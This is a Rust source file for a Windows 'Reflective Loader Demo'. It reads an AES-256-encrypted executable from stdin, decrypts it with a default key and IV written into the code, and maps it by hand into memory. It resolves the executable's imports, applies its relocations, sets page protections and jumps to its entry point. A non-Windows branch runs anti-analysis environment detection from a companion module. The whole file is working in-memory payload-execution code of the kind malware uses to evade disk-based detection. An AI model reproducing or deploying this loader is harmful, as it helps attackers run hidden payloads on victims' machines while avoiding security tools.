#[cfg(target_os = "windows")]
use std::io::Read;
#[cfg(target_os = "windows")]
use std::mem::{size_of, transmute};
#[cfg(target_os = "windows")]
use std::ptr::{copy_nonoverlapping, null_mut, write_bytes};
#[cfg(target_os = "windows")]
use std::slice;

#[cfg(target_os = "windows")]
use aes::Aes256;
#[cfg(target_os = "windows")]
use cbc::Decryptor;
#[cfg(target_os = "windows")]
use cbc::cipher::{
    BlockDecryptMut,
    block_padding::Pkcs7,
    KeyIvInit, // Trait that provides .new_from_slices()
};

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Diagnostics::Debug::{
    IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE,
    IMAGE_FILE_MACHINE_AMD64, IMAGE_OPTIONAL_HEADER64, IMAGE_SECTION_HEADER,
    IMAGE_BASE_RELOCATION, IMAGE_IMPORT_DESCRIPTOR, IMAGE_IMPORT_BY_NAME,
    IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DIRECTORY_ENTRY_BASERELOC,
    IMAGE_REL_BASED_ABSOLUTE, IMAGE_REL_BASED_HIGHLOW, IMAGE_REL_BASED_DIR64,
};

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE,
    PAGE_READONLY, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
    IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_WRITE,
};

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::LibraryLoader::{
    LoadLibraryA, GetProcAddress
};

#[cfg(target_os = "windows")]
const DEFAULT_AES_KEY: [u8; 32] = *b"ThisIs32BytesOfAKeyForAES-256!!"; // 32 bytes
#[cfg(target_os = "windows")]
const DEFAULT_AES_IV:  [u8; 16] = *b"16BytesOfInitVec";                // 16 bytes

#[cfg(target_os = "windows")]
fn get_aes_key() -> [u8; 32] {
    match std::env::var("AES_KEY") {
        Ok(key) => {
            if key.len() == 32 {
                let mut result = [0u8; 32];
                result.copy_from_slice(key.as_bytes());
                result
            } else {
                eprintln!("Warning: AES_KEY environment variable is not 32 bytes. Using default key.");
                DEFAULT_AES_KEY
            }
        },
        Err(_) => {
            eprintln!("Warning: AES_KEY environment variable not found. Using default key.");
            DEFAULT_AES_KEY
        }
    }
}

#[cfg(target_os = "windows")]
fn get_aes_iv() -> [u8; 16] {
    match std::env::var("AES_IV") {
        Ok(iv) => {
            if iv.len() == 16 {
                let mut result = [0u8; 16];
                result.copy_from_slice(iv.as_bytes());
                result
            } else {
                eprintln!("Warning: AES_IV environment variable is not 16 bytes. Using default IV.");
                DEFAULT_AES_IV
            }
        },
        Err(_) => {
            eprintln!("Warning: AES_IV environment variable not found. Using default IV.");
            DEFAULT_AES_IV
        }
    }
}

#[cfg(target_os = "windows")]
fn main() {
    println!("Reflective Loader Demo - No CreateThread variant");
    let mut encrypted_data = Vec::new();
    std::io::stdin().read_to_end(&mut encrypted_data)
        .expect("Failed to read from stdin");

    if encrypted_data.is_empty() {
        eprintln!("No input data received. Exiting.");
        return;
    }

    println!("Decrypting payload...");
    let aes_key = get_aes_key();
    let aes_iv = get_aes_iv();
    let mut decrypted_payload = match decrypt_aes256_cbc(&encrypted_data, &aes_key, &aes_iv) {
        Ok(p) => p,
        Err(e) => {
            eprintln!("Decryption error: {}", e);
            return;
        }
    };

    let dos_header = unsafe { &*(decrypted_payload.as_ptr() as *const IMAGE_DOS_HEADER) };
    if dos_header.e_magic != IMAGE_DOS_SIGNATURE as u16 {
        eprintln!("Not a valid PE file (MZ signature not found).");
        return;
    }

    let nt_headers_offset = dos_header.e_lfanew as usize;
    let nt_header_64 = unsafe {
        &*(decrypted_payload.as_ptr().add(nt_headers_offset) as *const IMAGE_NT_HEADERS64)
    };
    if nt_header_64.Signature != IMAGE_NT_SIGNATURE {
        eprintln!("Invalid PE signature.");
        return;
    }
    if nt_header_64.FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 {
        eprintln!("This demo loader only supports 64-bit AMD64 PEs.");
        return;
    }

    let opt_header = &nt_header_64.OptionalHeader;
    let image_size = opt_header.SizeOfImage as usize;
    let entry_rva  = opt_header.AddressOfEntryPoint as usize;
    let preferred_base = opt_header.ImageBase as usize;

    let alloc_base = unsafe {
        VirtualAlloc(
            null_mut(),
            image_size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        )
    };
    if alloc_base.is_null() {
        eprintln!("VirtualAlloc failed. Aborting.");
        return;
    }

    unsafe {
        copy_nonoverlapping(
            decrypted_payload.as_ptr(),
            alloc_base as *mut u8,
            opt_header.SizeOfHeaders as usize,
        );
    }

    let num_sections = nt_header_64.FileHeader.NumberOfSections as usize;
    let section_header_ptr = unsafe {
        decrypted_payload.as_ptr()
            .add(nt_headers_offset)
            .add(size_of::<IMAGE_NT_HEADERS64>())
    } as *const IMAGE_SECTION_HEADER;

    let sections = unsafe { slice::from_raw_parts(section_header_ptr, num_sections) };
    for sect in sections {
        let dest_ptr = (alloc_base as usize + sect.VirtualAddress as usize) as *mut u8;
        let raw_size = sect.SizeOfRawData as usize;
        let virt_size = sect.Misc.VirtualSize as usize;

        if raw_size > 0 {
            let src_ptr = decrypted_payload.as_ptr().add(sect.PointerToRawData as usize);
            unsafe {
                copy_nonoverlapping(src_ptr, dest_ptr, raw_size);
            }
        }
        if virt_size > raw_size {
            unsafe {
                write_bytes(
                    dest_ptr.add(raw_size),
                    0,
                    virt_size - raw_size,
                );
            }
        }
    }

    if opt_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress != 0 {
        if let Err(e) = resolve_imports(alloc_base as usize, opt_header) {
            eprintln!("Import resolution error: {}", e);
            return;
        }
    }

    if let Err(e) = apply_relocations(alloc_base as usize, preferred_base, opt_header) {
        eprintln!("Relocation error: {}", e);
        return;
    }

    if let Err(e) = set_section_permissions(alloc_base as usize, &sections, opt_header) {
        eprintln!("Failed to set section protections: {}", e);
        return;
    }

    unsafe {
        let mut old_protect = 0;
        VirtualProtect(
            alloc_base,
            opt_header.SizeOfHeaders as usize,
            PAGE_READONLY,
            &mut old_protect,
        );
    }

    let entry_point = alloc_base as usize + entry_rva;
    println!("Calling entry point at: 0x{:X}", entry_point);
    unsafe {
        let entry_fn: extern "system" fn() -> i32 = transmute(entry_point);
        let exit_code = entry_fn();
        println!("Payload returned exit code: {}", exit_code);
    }

    for b in &mut decrypted_payload {
        *b = 0;
    }
}

#[cfg(not(target_os = "windows"))]
mod protection;

#[cfg(not(target_os = "windows"))]
fn main() {
    println!("This reflective loader is designed to run on Windows only.");
    println!("It contains Windows-specific code that cannot run on this platform.");
    println!("Please compile and run this on a Windows machine.");
    
    println!("\nDemonstrating secure key generation:");
    match protection::key_generator::generate_aes256_key() {
        Ok(key) => {
            println!("Generated AES-256 key: {:?}", key);
            println!("Key length: {} bytes", key.len());
        },
        Err(e) => println!("Error generating key: {}", e),
    }
    
    match protection::key_generator::generate_aes_iv() {
        Ok(iv) => {
            println!("Generated AES IV: {:?}", iv);
            println!("IV length: {} bytes", iv.len());
        },
        Err(e) => println!("Error generating IV: {}", e),
    }
    
    println!("\nPerforming environment analysis for legitimate security purposes:");
    let analysis = protection::anti_analysis::analyze_environment();
    println!("Analysis detected suspicious environment: {}", analysis.detected);
    if analysis.detected {
        println!("Detections:");
        for detection in &analysis.detections {
            println!("  - {:?}", detection);
        }
    } else {
        println!("No suspicious environment detected.");
    }
    
    println!("\nDemonstrating secure file loading mechanism:");
    println!("This mechanism keeps files encrypted on disk and only decrypts them in memory when needed.");
    
    let temp_dir = std::env::temp_dir();
    let demo_file_path = temp_dir.join("demo_encrypted.bin");
    
    println!("Creating a demo encrypted file at: {:?}", demo_file_path);
    
    let _demo_key = match protection::key_generator::generate_aes256_key() {
        Ok(key) => {
            println!("Generated secure AES-256 key for file encryption");
            key
        },
        Err(e) => {
            println!("Error generating key: {}", e);
            return;
        }
    };
    
    let _demo_iv = match protection::key_generator::generate_aes_iv() {
        Ok(iv) => {
            println!("Generated secure AES IV for file encryption");
            iv
        },
        Err(e) => {
            println!("Error generating IV: {}", e);
            return;
        }
    };
    
    let demo_content = b"This is a demonstration of secure file loading. In a real implementation, this would be encrypted with AES-256-CBC.";
    if let Err(e) = std::fs::write(&demo_file_path, demo_content) {
        println!("Error writing demo file: {}", e);
        return;
    }
    
    println!("Demo file created successfully.");
    println!("In a real implementation, we would load and decrypt this file using:");
    println!("  let protected_file = protection::file_loader::load_encrypted_file(");
    println!("      \"{:?}\",", demo_file_path);
    println!("      &key,");
    println!("      &iv,");
    println!("  );");
    println!("The file would remain encrypted on disk and only be decrypted in memory.");
    println!("When done with the file, its memory would be securely wiped.");
    
    if let Err(e) = std::fs::remove_file(&demo_file_path) {
        println!("Warning: Could not remove demo file: {}", e);
    }
}

#[cfg(target_os = "windows")]
fn decrypt_aes256_cbc(
    ciphertext: &[u8],
    key: &[u8],
    iv: &[u8],
) -> Result<Vec<u8>, String> {
    if key.len() != 32 || iv.len() != 16 {
        return Err("Key must be 32 bytes, IV must be 16 bytes.".into());
    }
    let cipher = Decryptor::<Aes256>::new_from_slices(key, iv)
        .map_err(|_| "new_from_slices failed (invalid key/iv?)".to_string())?;
    cipher
        .decrypt_padded_vec_mut::<Pkcs7>(ciphertext)
        .map_err(|e| format!("AES-256-CBC decryption failed: {:?}", e))
}

#[cfg(target_os = "windows")]
fn resolve_imports(image_base: usize, opt_header: &IMAGE_OPTIONAL_HEADER64) -> Result<(), String> {
    let import_dir = opt_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    let import_desc_ptr = (image_base + import_dir.VirtualAddress as usize) as *const IMAGE_IMPORT_DESCRIPTOR;

    unsafe {
        let mut idx = 0;
        loop {
            let desc = *import_desc_ptr.add(idx);
            if desc.Name == 0 {
                break; // No more import descriptors
            }
            let dll_name_ptr_u8 = (image_base + desc.Name as usize) as *const u8;

            let dll_handle = LoadLibraryA(dll_name_ptr_u8);
            if dll_handle == 0 {
                let dll_name_i8 = dll_name_ptr_u8 as *const i8;
                let dll_name = std::ffi::CStr::from_ptr(dll_name_i8).to_string_lossy();
                return Err(format!("Failed to load library: {}", dll_name));
            }

            let mut oft_ptr = (image_base + desc.OriginalFirstThunk as usize) as *const usize;
            let mut ft_ptr  = (image_base + desc.FirstThunk as usize) as *mut usize;

            if desc.OriginalFirstThunk == 0 {
                oft_ptr = ft_ptr as *const usize;
            }

            let mut i = 0;
            loop {
                let lookup_val = *oft_ptr.add(i);
                if lookup_val == 0 {
                    break; // end of this import descriptor
                }

                let func_addr: usize;

                if (lookup_val & 0x8000000000000000) != 0 {
                    let ordinal = (lookup_val & 0xFFFF) as u16;
                    let proc_opt = GetProcAddress(dll_handle, ordinal as *const u8);
                    if let Some(fn_ptr) = proc_opt {
                        func_addr = fn_ptr as usize;
                    } else {
                        return Err(format!("Failed to resolve ordinal {}", ordinal));
                    }
                } else {
                    let ibn_ptr = (image_base + lookup_val as usize) as *const IMAGE_IMPORT_BY_NAME;
                    let name_ptr_u8 = (*ibn_ptr).Name.as_ptr();
                    let proc_opt = GetProcAddress(dll_handle, name_ptr_u8);
                    if let Some(fn_ptr) = proc_opt {
                        func_addr = fn_ptr as usize;
                    } else {
                        let name_i8 = name_ptr_u8 as *const i8;
                        let func_name = std::ffi::CStr::from_ptr(name_i8).to_string_lossy();
                        return Err(format!("Failed to resolve import by name: {}", func_name));
                    }
                }

                *ft_ptr.add(i) = func_addr;
                i += 1;
            }
            idx += 1;
        }
    }
    Ok(())
}

#[cfg(target_os = "windows")]
fn apply_relocations(
    image_base: usize,
    preferred_base: usize,
    opt_header: &IMAGE_OPTIONAL_HEADER64
) -> Result<(), String> {
    let base_reloc_dir = opt_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
    let reloc_va  = base_reloc_dir.VirtualAddress as usize;
    let reloc_end = reloc_va + base_reloc_dir.Size as usize;

    if reloc_va == 0 {
        return Ok(()); // no relocations
    }
    let delta = (image_base as isize) - (preferred_base as isize);
    if delta == 0 {
        return Ok(()); // loaded at preferred base
    }

    unsafe {
        let mut current_block = (image_base + reloc_va) as *const IMAGE_BASE_RELOCATION;
        while (current_block as usize) < (image_base + reloc_end) {
            let block = *current_block;
            if block.SizeOfBlock == 0 {
                break;
            }
            let entries_count = (block.SizeOfBlock as usize - size_of::<IMAGE_BASE_RELOCATION>()) / 2;
            let reloc_info_ptr = (current_block as usize + size_of::<IMAGE_BASE_RELOCATION>()) as *const u16;

            for i in 0..entries_count {
                let entry = *reloc_info_ptr.add(i);
                let reloc_type = entry >> 12;
                let offset     = entry & 0xFFF;

                match reloc_type as u32 {
                    IMAGE_REL_BASED_ABSOLUTE => { /* no fixup needed */ }
                    IMAGE_REL_BASED_DIR64 => {
                        let patch_addr = (image_base + block.VirtualAddress as usize + offset as usize) as *mut usize;
                        *patch_addr = (*patch_addr as isize + delta) as usize;
                    }
                    IMAGE_REL_BASED_HIGHLOW => {
                        let patch_addr = (image_base + block.VirtualAddress as usize + offset as usize) as *mut u32;
                        *patch_addr = (*patch_addr as i64 + delta as i64) as u32;
                    }
                    _ => {}
                }
            }
            current_block = (current_block as usize + block.SizeOfBlock as usize) as *const IMAGE_BASE_RELOCATION;
        }
    }
    Ok(())
}

#[cfg(target_os = "windows")]
fn set_section_permissions(
    image_base: usize,
    sections: &[IMAGE_SECTION_HEADER],
    opt_header: &IMAGE_OPTIONAL_HEADER64,
) -> Result<(), String> {
    unsafe {
        for sect in sections {
            let rva = sect.VirtualAddress as usize;
            let size = sect.Misc.VirtualSize as usize;
            if size == 0 {
                continue;
            }
            let dest_ptr = (image_base + rva) as *mut core::ffi::c_void;

            let characteristics = sect.Characteristics;
            let is_exec  = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
            let is_write = (characteristics & IMAGE_SCN_MEM_WRITE)   != 0;

            let new_protect = match (is_exec, is_write) {
                (true, true)  => PAGE_EXECUTE_READWRITE,
                (true, false) => PAGE_EXECUTE_READ,
                (false, true) => PAGE_READWRITE,
                _             => PAGE_READONLY,
            };

            let mut old_protect = 0;
            if VirtualProtect(dest_ptr, size, new_protect, &mut old_protect) == 0 {
                return Err(format!("VirtualProtect failed for section at RVA=0x{:X}", rva));
            }
        }
    }
    Ok(())
}
